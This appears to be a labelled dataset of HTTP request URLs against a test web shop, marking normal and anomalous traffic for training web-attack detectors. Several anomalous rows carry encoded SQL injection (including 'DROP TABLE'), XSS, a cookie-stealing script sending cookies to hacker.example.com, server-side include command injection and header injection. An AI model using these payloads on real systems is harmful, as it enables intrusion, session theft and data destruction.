URL,Target
http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito ,1
http://localhost:8080/tienda1/publico/carrito.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp ,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5100&B1=Confirmar ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,1
http://localhost:8080.INC ,1
http://localhost:8080/tienda1/publico/pagar.jsp ,0
http://localhost:8080/tienda1/publico/anadir.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/global/estilos.css ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,0
http://localhost:8080/tienda1/miembros/6909030637832563290.jsp.INC ,1
http://localhost:8080/tienda1/publico/autenticar.jsp ,0
http://localhost:8080/tienda1/publico/productos.jsp ,0
http://localhost:8080/tienda1/publico/anadir.jsp ,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=mebine&password=L16o2o&nombre=Filis&apellidos=Antih+Sacido&email=rosenblatt%40hormigon-impreso.az&dni=00699529F&direccion=Plaza+Pe%F1a+Gudina%2C+14%2C+&ciudad=San+Vicente+de+Ar%E9valo&cp=06660&provincia=Tarragona&ntc=8741178125642533&B1=Registrar ,0
http://localhost:8080/samples/sampsite/about.htm ,1
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/imagenes/1.gif ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=hawryszk7&password=As8643o0d4&nombre=Paloma&apellidos=Z*%3Fega+Delgado&email=cailloy%40941.lt&dni=02251300Z&direccion=Calle+Chafarinas+168+&ciudad=D%FArcal&cp=19119&provincia=Zaragoza&ntc=9097917444528298&B1=Registrar ,1
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/global/estilos.css ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=sinha1&pwd=c%E1LCIca&remember=on%2F&B1=Entrar ,1
http://localhost:8080/tienda1/global/menum.jsp ,0
http://localhost:8080/tienda1/publico/4861362529278789730 ,1
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/imagenes/logo.gif ,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito ,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=ettson&password=6A86Q3iS2O&nombre=Quinto&apellidos=Corominas+Corcoy&email=omiya_bogetti%40casablancabeach.gobAND+1%3D1&dni=03995650K&direccion=C%2F+Reyes+Magos+130%2C+&ciudad=Nuevo+Bazt%E1n&cp=07191&provincia=Zamora&ntc=1916434162940533&B1=Registrar ,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=39&cantidad=32&B1=A%F1adir+al+carrito ,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=s%2Fhakor&password=3749s63a&nombre=Avito&apellidos=Zalarich+Llufriu&email=saul%40expertmagnet.np&dni=14335839P&direccion=C%2F+Barranquet+130+&ciudad=Calzada+de+los+Molinos&cp=50470&provincia=A+Coru%F1a&ntc=9270239658811052&B1=Registrar ,1
http://localhost:8080/tienda1/imagenes/logo.gif ,0
http://localhost:8080/tienda1/global/menum.jsp ,0
http://localhost:8080/travelnet/home.jsp ,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=%2520&precio=85&cantidad=23&B1=A%F1adir+al+carrito ,1
http://localhost:8080/tienda1/imagenes/3.gif ,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=kirbee&password=for%E1nea&nombre=Mara&apellidos=Bicelis+Calder%F3n&email=conried6%40misanimalesdomesticos.ky&dni=81878772Z&direccion=Galileo%2C+76%2C+6-A&ciudad=Trigueros+del+Valle&cp=23591&provincia=Valencia&ntc=8588111212393329&B1=Registrar ,0
http://localhost:8080/tienda1/imagenes/3.gif ,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas ,1
http://localhost:8080/tienda1/miembros/fotos.jsp ,0
http://localhost:8080/IISSamples/sdk/asp/docs/sampfram.asp ,1
http://localhost:8080/tienda1/imagenes/3.gif ,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg ,0
http://localhost:8080/tienda1/global/estilos.css ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5335&B1=Confirmar ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,1
http://localhost:8080/tienda1/publico/pagar.jsp ,0
http://localhost:8080/tienda1/publico/productos.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito ,0
http://localhost:8080/tienda1/miembros/index.jsp ,0
http://localhost:8080/tienda1/global/creditos.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=terryl&password=des9erco&nombre=Haroid&apellidos=Dawaher&email=%27INJECTED_PARAM&dni=14559882P&direccion=C%2F+Doctor+Francisco+Saiz+Sanz%2C+159%2C+&ciudad=Alberca%2C+La&cp=03770&provincia=Salamanca&ntc=3772824400880183&B1=Registrar ,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2694&B1=Pasar+por+caja ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C&login=tiong-ho&password=an1l5m9no&nombre=Hadasa&apellidos=Subias&email=parada.biuchet4%40aulahost.gw&dni=79845869N&direccion=Jacinto+Benavente%2C+165+7F&ciudad=Herreruela&cp=11330&provincia=Teruel&ntc=4461899477803914&B1=Registrar ,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1140&B1=Confirmar ,0
http://localhost:8080/tienda1/imagenes/logo.gif ,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg ,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg ,0
http://localhost:8080/tienda1/imagenes/1.gif.Bak ,1
http://localhost:8080/tienda1/publico/miembros.jsp ,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas ,0
http://localhost:8080/samples/sampsite/results.htm ,1
http://localhost:8080/tienda1/4861362529278789730 ,1
http://localhost:8080/tienda1/publico/carrito.jsp ,0
http://localhost:8080/_vti_log/ ,1
http://localhost:8080/tienda1/imagenes/logo.gif ,0
http://localhost:8080/tienda1/miembros/index.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=adrie&password=sv%E1stica&nombre=Tersilio&apellidos=Usma+Launes&email=morgenstern9%40laschinas.ba&dni=17155306C&direccion=C%2F+Canuda+176%2C+11B&ciudad=A%EDnsa-Sobrarbe&cp=10940&provincia=Teruel&ntc=5326624144210576&B1=Registrar ,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=tsern&password=S87abOC9do4&nombre=Nadir&apellidos=Ganci+Zanuy&email=wolfstone%40g-audio.a%40ero&dni=01364603J&direccion=Carrer+Sant+Antoni%2C+S%2FN+&ciudad=Torre+del+Bierzo&cp=33780&provincia=Ourense&ntc=6172384858877900&B1=Registrar ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1 ,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=idt&password=iNCR%E9Du69&nombre=Albertina&apellidos=Ballonga&email=lorenson-tordi%40youtubeanunciox.fk&dni=22446221S&direccion=Caridad+82%2C+&ciudad=Carmena&cp=14860&provincia=Zaragoza&ntc=3805288652067342&B1=Registrar ,0
http://localhost:8080/tienda1/global/titulo.jsp ,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg ,0
http://localhost:8080/tienda1/imagenes/1.gif ,0
http://localhost:8080/tienda1/miembros/fotos.jsp ,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg ,0
http://localhost:8080/tienda1/publico/vaciar.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8223&B1=Confirmar%2F ,1
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/mail.box ,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=39&cantidad=82&B1=A%F1adir+al+carrito ,0
http://localhost:8080/tienda1/publico/anadir.jsp ,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas ,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas ,1
http://localhost:8080/tienda1/publico/registro.jsp ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,0
http://localhost:8080/tienda1/index.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=abdullah&pwd=mil%27i%2Fa5%2Fio&remember=on&B1=Entrar ,1
http://localhost:8080.Old ,1
http://localhost:8080/tienda1/imagenes/logo.gif ,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=farlay&password=AFlEcHaTE&nombre=Eduardo&apellidos=Blanquer&email=ludwig_schuster%40vi%F1avilano.web&dni=12785855V&direccion=Calle+Almonte+68%2C+5%3FG&ciudad=Yuncos&cp=41240&provincia=Ja%E9n&ntc=9528500439395561&B1=Registrar ,0
http://localhost:8080/tienda1/miembros/index.jsp/asf-logo-wide.Inc ,1
http://localhost:8080/tienda1/imagenes/cmenbul.gif ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8088&B1=Pasar+por+caja ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,1
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg/asf-logo-wide.gif/ ,1
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,0
http://localhost:8080/tienda1/publico/miembros.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=skillen&pwd=pluTocracia%22+AND+%221%22%3D%221&remember=off&B1=Entrar ,1
http://localhost:8080/tienda1/imagenes/cmenbul.gif ,0
http://localhost:8080/tienda1/publico/vaciar.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/publico/asf-logo-wide.gif ,1
http://localhost:8080/tienda1/index.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp ,1
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg.inc ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp ,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&login=chaar&pwd=pe4ibl171o&remember=on&B1=Entrar ,1
http://localhost:8080/tienda1/publico/miembros.jsp ,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas ,0
http://localhost:8080/tienda1/global/titulo.jsp ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/publico/entrar.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=anthea&pwd=hOrr%EDS_Ono&remember=onAND+1%3D1&B1=Entrar ,1
http://localhost:8080/tienda1/publico/pagar.jsp/asf-logo-wide.gif.inc ,1
http://localhost:8080/tienda1/publico/autenticar.jsp ,0
http://localhost:8080/tienda1/miembros/index.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 ,0
http://localhost:8080/tienda1/publico/carrito.jsp ,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif ,0
http://localhost:8080/tienda1/global/titulo.jsp ,0
http://localhost:8080/tienda1/miembros/fotos.jsp ,0
http://localhost:8080/tienda1/miembros/salir.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito ,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+.*%3FRioja&precio=85&cantidad=22&B1=A%F1adir+al+carrito ,1
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8217&B1=Confirmar ,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,1
http://localhost:8080/tienda1/publico/autenticar.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=panosh&password=m7866&nombre=Heraclio&apellidos=Carrique+Orri&email=mascarino.marenghi%40cocheacoche.lv&dni=51858384P&direccion=Cami%F1o+Adelfas%2C+148%2C+5%3FG&ciudad=Lladorre&cp=10650&provincia=Zamora&ntc=3869324280583649&B1=Registrar ,0
http://localhost:8080/tienda1/miembros/index.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp ,1
http://localhost:8080/tienda1/publico/registro.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&B1=Pasar+por+caja ,1
http://localhost:8080/tienda1/global/menum.jsp ,0
http://localhost:8080/tienda1/imagenes/2.gif ,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=hews&password=01r1f9co&nombre=Natalio&apellidos=Sams%F3+Agea&email=piesa-diestel%40hacia.tz&dni=22011041H&direccion=C%2F+Dique+De+Abrigo+96+5%3FH&ciudad=Novallas&cp=47649&provincia=Navarra&ntc=3618056132500846&B1=Registrar ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=291&B1=Confirmar%2F ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp ,1
http://localhost:8080/tienda1/publico/vaciar.jsp ,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=randall&pwd=la&remember=on&B1=Entrar ,0
http://localhost:8080/tienda1/miembros/index.jsp ,0
http://localhost:8080/webapp/examples/verify ,1
http://localhost:8080/tienda1/global/estilos.css ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=brandt&password=2j2St1&nombre=Rohan&apellidos=Tinto+Higueras&email=kirov%40ofertachina.fm&dni=16601924H&direccion=C%2F+Nicolas+Salmeron+73+&ciudad=Zarra&cp=45100&provincia=Asturias&ntc=8105619729303205&B1=Registrar ,0
http://localhost:8080/tienda1/imagenes/2.gif ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/publico/carrito.jsp ,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=spears&password=cOMisORiO&nombre=Triana&apellidos=Del+%C1ngel+Kercad%F3&email=pesche%40campodegolf.com.sy&dni=10421521Z&direccion=Etorbidea+Askatasuna+170%2C+8%3FA&ciudad=Valseca&cp=32633&provincia=C%F3rdoba&ntc=2754013363983769&B1=Registrar ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 ,0
http://localhost:8080/tienda1/imagenes/logo.gif ,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg ,0
http://localhost:8080/tienda1/index.jsp ,0
http://localhost:8080/tienda1/global/estilos.css ,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg ,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas ,1
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg ,0
http://localhost:8080/tienda1/publico/registro.jsp ,1
http://localhost:8080/tienda1/publico/vaciar.jsp.inc ,1
http://localhost:8080/tienda1/global/creditos.jsp ,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=276&B1=Confirmar ,1
http://localhost:8080/tienda1/global/creditos.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/imagenes/2.gif ,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E ,1
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/asf-logo-wide.gif/ ,1
http://localhost:8080/tienda1/imagenes/3.gif ,0
http://localhost:8080/tienda1/global/estilos.css ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1 ,1
http://localhost:8080/tienda1/publico/anadir.jsp ,1
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/publico/vaciar.jsp ,1
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/imagenes/2.gif/6909030637832563290.jsp ,1
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=100&cantidad=73&B1=A%F1adir+al+carrito ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,1
http://localhost:8080/tienda1/miembros/index.jsp ,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg ,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas ,1
http://localhost:8080/tienda1/publico/vaciar.jsp ,0
http://localhost:8080.old ,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=burdette&password=alm3donad6&nombre=Luciliano&apellidos=Maroto+Fancelli&email=voldstad3%40enlapalma.com.gy&dni=89061921X&direccion=C%2F+Rams%2C+70+11-F&ciudad=Hornillos+de+Cameros&cp=19119&provincia=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&ntc=2545576057068640&B1=Registrar ,1
http://localhost:8080/tienda1/publico/entrar.jsp ,0
http://localhost:8080/tienda1/publico/anadir.jsp ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp?modoA=registro&login=lachance&password=su5a&nombre=Rogato&apellidos=Cucarell+Caridad&email=zmed%40tabernarinconete.uk&dni=19477061V&direccion=Manuel+Paez+Xaramillo+33%2C+6B&ciudad=Estella%2FLizarra&cp=26321&provincia=Tarragona&ntc=9995470732934706&B1=Registrar ,1
http://localhost:8080/tienda1/imagenes/3.gif ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/global/estilos.css ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,1
http://localhost:8080/tienda1/publico/miembros.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&password=idealismo&nombre=Ian&apellidos=Sacota+Xech&email=alland.soeltoft%40aridossanchez.do&dni=28681618C&direccion=C%2F+Valencia+S%2FN+11A&ciudad=Pancorbo&cp=26321&provincia=Alicante&ntc=3366384544522158&B1=Registrar ,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=+&B1=A%F1adir+al+carrito ,1
http://localhost:8080/tienda1/imagenes/1.gif/asf-logo-wide.INC ,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito ,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=85&cantidad=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&B1=A%F1adir+al+carrito ,1
http://localhost:8080/tienda1/asf-logo-wide.Bak ,1
http://localhost:8080/tienda1/publico/autenticar.jsp/.java ,1
http://localhost:8080/tienda1/publico/registro.jsp ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 ,0
http://localhost:8080/tienda1/imagenes/logo.gif ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=ula&password=62r3.ej%F3n&nombre=Elisandro&apellidos=Abenoza+Esplugues&email=schwarzenegger%40cirugiaplasticacordoba.om&dni=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&direccion=Jota+Aragonesa+15+1F&ciudad=Espada%F1edo&cp=18516&provincia=Alicante&ntc=6708069843609931&B1=Registrar ,1
http://localhost:8080/tienda1/imagenes/1.gif ,0
http://localhost:8080/tienda1/index.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1 ,1
http://localhost:8080/tienda1/publico/registro.jsp ,0
http://localhost:8080/tienda1/publico/asf-logo-wide.bak ,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=39%2F&cantidad=83&B1=A%F1adir+al+carrito ,1
http://localhost:8080/tienda1/miembros/index.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,1
http://localhost:8080/tienda1/publico/autenticar.jsp ,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&loginA=emelia7&password=e6u*ipolado&nombre=Gelsomino&apellidos=Medio+Bullones&email=radzum_noriega%40alcantarapartners.hr&dni=15508885P&direccion=C%2F+Cadernera%2C+180%2C+5%3FC&ciudad=B%F3veda&cp=06360&provincia=La+Rioja&ntc=3331042207803695&B1=Registrar ,1
